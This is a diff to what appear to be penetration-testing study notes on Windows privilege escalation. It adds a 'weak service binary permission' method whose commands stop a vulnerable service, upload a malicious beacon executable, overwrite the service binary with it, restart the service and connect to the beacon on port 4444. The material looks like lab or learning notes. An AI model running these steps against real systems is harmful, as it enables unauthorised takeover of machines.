@@ -197,6 +197,13 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 14. Next -> `connect localhost 4444`
 15. Theme: **if there are weak permissions against an application, we can modify its .exe path and get our malicious .exe in C:\temp get executed**
 #### method -> weak service binary permission
+1. This is just like the above vulnerablity, just small modifications i.e. we have **modify** permission. This allows us to simply overwrite the binary with something else (make sure you take a backup first).
+2. So make a new malicious **tcp-beacon.exe**. 
+3. Stop the vuln service `run sc stop Vuln-Service-3`
+4. Upload -> `upload tcp-beacon.exe`
+5. Rename it to -> `mv tcp-beacon.exe vuln-service-3.exe`
+6. Start -> `run sc start Vuln-Service-3`
+7. Connect -> `connect localhost 4444`
 
 #### method -> always install elevated
 
